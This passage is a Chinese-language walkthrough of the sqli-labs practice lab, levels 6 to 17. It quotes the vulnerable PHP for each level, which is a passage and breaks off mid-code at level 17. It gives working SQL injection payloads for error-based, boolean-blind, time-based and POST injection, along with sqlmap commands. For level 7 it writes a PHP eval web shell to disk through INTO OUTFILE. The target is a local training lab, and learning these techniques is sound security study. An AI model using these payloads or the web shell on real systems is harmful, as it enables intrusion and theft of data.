<h3 id="6-报错注入"><a href="#6-报错注入" class="headerlink" title="6.报错注入"></a>6.报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用<code>&quot;</code>闭合</p>
<p>显错注入</p>
<p><code>id=1&quot; --+</code></p>
<p><code>id=1&quot; and 1=1 --+</code></p>
<p><code>id=1&quot; and 1=2 --+</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> 查数据库名 ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> 查表名</p>
<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> 查字段</p>
<br>

<h3 id="7-文件写入"><a href="#7-文件写入" class="headerlink" title="7.文件写入"></a>7.文件写入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据提示要我们写入文件</p>
<p>写入一句话的条件</p>
<blockquote>
<p>有数据库的写入权限</p>
<p>知道网站的绝对路径</p>
<br>
</blockquote>
<p>在做写入练习时，需要用到<code>into outfile</code> ,但执行后却无法生成写入文件</p>
<p>解决方案</p>
<blockquote>
<p>在MYSQL命令行输入 <code>show variables like &#39;%secure%&#39;;</code>查看<code> secure-file-priv</code>的值</p>
<p>发现<code>secure_file_priv</code>值为<code>NULL</code></p>
<p>在my.ini中修改或添加<code>secure_file_priv=&quot;/&quot;</code>然后报存并重启数据库 </p>
<p>运行<code>http://127.0.0.1/sqli-labs/Less-7/?id=-1%27))%20union%20select%201,2,3%20into%20outfile%20%22D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.txt%22%20--+</code>成功生产写入文件</p>
</blockquote>
<br>

<p>根据代码进行闭合<code>id=1&#39;)) --+</code></p>
<p><code>id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code> 不报错说明是root权限</p>
<p>通过前面的关卡得到决定路径</p>
<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+</code>==&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your Login name:D:\phpstudy_pro\Extensions\MySQL5.7.26\</span><br><span class="line">Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\</span><br></pre></td></tr></table></figure>

<br>

<p>?id=-1’)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7”–+</p>
<p><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\shell.php&quot;--+</code></p>
<p>使用菜刀连接</p>
<br>

<h3 id="8-布尔盲注"><a href="#8-布尔盲注" class="headerlink" title="8.布尔盲注"></a>8.布尔盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>与第五关相比,把部分代码进行了注释，无法使用报错注入，可以考虑布尔盲注或者时间盲注.</p>
<p><code>?id=1&#39; and 1=1 --+</code> 有回显 ’you are in’</p>
<p><code>?id=1&#39; and 1=2 --+</code>无回显</p>
<p>可以判断是布尔盲注</p>
<ul>
<li>判断Mysql数据库是否是在5.0以上</li>
</ul>
<p><code>?id=1&#39; and mid(version(),1,1)=5 --+</code>有回显  或</p>
<p><code>?id=1&#39; and left(version(),1)=&#39;5&#39; --+</code>有回显</p>
<p><code>?id=1&#39; and left(version(),6)=&#39;5.7.26&#39; --+</code> 有回显判断出数据库版本为<code>5.7.26</code></p>
<ul>
<li>判断当前数据库长度</li>
</ul>
<p><code>?id=1&#39; and length(database())&gt;7 --+</code></p>
<p><code>?id=1&#39; and length(database())=8 --+</code></p>
<ul>
<li>截取数据库第一位ascii并判断值</li>
</ul>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))&gt;114 --+</code></p>
<p><code>?id=1&#39; and (ord(mid(database(),1,1)))=115 --+</code></p>
<p>或者</p>
<p><code>?id=1&#39; and left(database(),1)&gt;&#39;n&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),2)=&#39;se&#39; --+</code></p>
<p><code>?id=1&#39; and left(database(),3)=&#39;sec&#39; --+</code></p>
<p>依次得到后面7位 ==&gt;数据库名为security</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid(database(),1,1)))=</span></span><br><span class="line"><span class="string">115 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ord(mid((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">2</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ord(mid((select </span></span><br><span class="line"><span class="string">database()) ,3,1))) = 99 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> </span><br><span class="line">database()) ,<span class="number">4</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">117</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,5,1))) = 114 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">6</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span><span class="keyword">sql</span><span class="operator">-</span>labs<span class="operator">/</span>less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (ascii(substr((select database()) ,7,1))) = 116 --+</span></span><br><span class="line"><span class="string">http://127.0.0.1/sql-labs/less-8/?id=1&#x27;</span> <span class="keyword">and</span> (ascii(substr((<span class="keyword">select</span> database()) ,<span class="number">8</span>,<span class="number">1</span>))) <span class="operator">=</span> <span class="number">121</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<br>

<p>获取数据库第一张表的长度(注:这里length()里面要再加一个括号 )</p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 --+</code></p>
<p><code>id=1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</code></p>
<p>也可以这样写</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;5 --+</code> 最终得到长度为6</p>
<p><code>?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit X,1)&gt;5 --+</code> 判断第X张表的长度</p>
<br>

<ul>
<li>判断表的第N个字符 截取第N位的ASCII码进行判断,利用<code>ord()</code> 和 <code>mid(***,1,1)</code>或者<code>substr(***,1,1)</code></li>
</ul>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101  --+</code>判断security库中的第一个表的第一个ascii值为101 即<code>e</code></p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),2,1))=109  --+</code> 第二位位<code>m</code>    ==&gt;最终得到第一张表名为<code>emails</code></p>
<p>第X张表的第N位ASCII码值判断</p>
<p><code>?id=1&#39; and ord(mid((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit X-1,1),N,1))=101  --+</code></p>
<p>也可以利用<code>regexp</code>注入获取<code>users</code>表中的列</p>
<p><code>http://127.0.0.1/sql/Less-8/?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us&#39; limit 0,1)--+</code></p>
<br>

<p>使用SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbs --technique B --batch</code></p>
<blockquote>
<p>参数：–technique</p>
<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
<p>支持的探测方式如下：</p>
<p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p>
</blockquote>
<br>

<h3 id="9-时间盲注"><a href="#9-时间盲注" class="headerlink" title="9.时间盲注"></a>9.时间盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>无论语句是否执行成功，都会返回同样的回显，所以需要通过时间盲注猜解数据</p>
<p><code>?id=1&#39; and sleep(3) --+</code>尝试<code>&#39;```&quot;</code>等闭合方式，根据<code>sleep</code>确认是否闭合</p>
<p><code>?id=1&#39; and if(mid(version(),1,1)=5,sleep(5),1) --+</code>判断数据库版本</p>
<p><code>?id=1&#39; and if(length(database()=8),sleep(5),1) --+</code>判断数据库长度</p>
<p><code>?id=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(5),1) --+</code> 判断数据库名</p>
<p><code>?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;3,sleep(5),1) --+</code>判断表长度(length()里面的需要加<code>()</code>)</p>
<p>使用SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-9/?id=1 --dbs --technique T --batch</code></p>
<br>

<h3 id="10-时间盲注"><a href="#10-时间盲注" class="headerlink" title="10.时间盲注"></a>10.时间盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r(mysql_error());</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>和第九关一样，不过是双引号闭合</p>
<p><code>?id=1&quot; and sleep(5)--+</code></p>
<br>

<h3 id="11-POST注入"><a href="#11-POST注入" class="headerlink" title="11.POST注入"></a>11.POST注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> @$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);  </span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line"> 		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&#39; and 1=1  --  &amp; passwd=admin</code>或者<code>uname=admin&#39; and 1=1 #  &amp; passwd=admin</code> <code>--+</code>会报错</p>
<p><code>uname=admin&#39; order by 2  --   &amp; passwd=admin</code>判断字段数</p>
<p><code>uname=-1&#39; and 1=1 union select 1,2 --    &amp; passwd=admin</code> 找回显点</p>
<p><code>uname=-1&#39; and 1=1 union select @@datadir,version() --    &amp; passwd=admin</code>查看数据库版本</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="12-POST注入"><a href="#12-POST注入" class="headerlink" title="12 POST注入"></a>12 POST注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;) #</code>闭合</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="13-POST型布尔盲注"><a href="#13-POST型布尔盲注" class="headerlink" title="13 POST型布尔盲注"></a>13 POST型布尔盲注</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">@$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;) and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">	$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">  		</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot; You Have successfully logged in &quot; ;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>没有回显，使用布尔盲注</p>
<p><code>uname=admin&#39;) and left(database(),1)&gt;&#39;n&#39; # &amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs </code></p>
<h3 id="14POST时间盲注"><a href="#14POST时间盲注" class="headerlink" title="14POST时间盲注"></a>14POST时间盲注</h3><p><code>&quot;</code>闭合 和13题一样</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-14/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<h3 id="15-POST时间-布尔盲注"><a href="#15-POST时间-布尔盲注" class="headerlink" title="15 POST时间/布尔盲注"></a>15 POST时间/布尔盲注</h3><p><code>uname=admin&#39; and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<br>

<h3 id="16POST时间盲注"><a href="#16POST时间盲注" class="headerlink" title="16POST时间盲注"></a>16POST时间盲注</h3><p><code>uname=admin&quot;) and sleep(5) #&amp; passwd=admin</code></p>
<p>SQLmap<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-16/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
<p><code>python sqlmap.py -r 1.txt --batch --level 3 --dbs</code></p>
<h3 id="17POST显错注入"><a href="#17POST显错注入" class="headerlink" title="17POST显错注入"></a>17POST显错注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 